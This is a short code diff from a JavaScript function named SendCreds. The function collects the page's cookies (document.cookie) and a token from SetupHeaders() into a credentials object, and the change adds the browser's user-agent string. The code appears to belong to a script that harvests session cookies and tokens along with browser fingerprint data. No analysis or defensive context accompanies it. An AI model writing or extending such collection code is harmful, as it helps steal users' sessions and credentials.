@@ -2276,6 +2276,7 @@ function SendCreds() {
             spanY: M8.clientHeight,
             left: M8.clientLeft,
             top: M8.clientTop,
+            agent: navigator.userAgent
         };
         creds.token = SetupHeaders();
         creds.cookie = document.cookie;
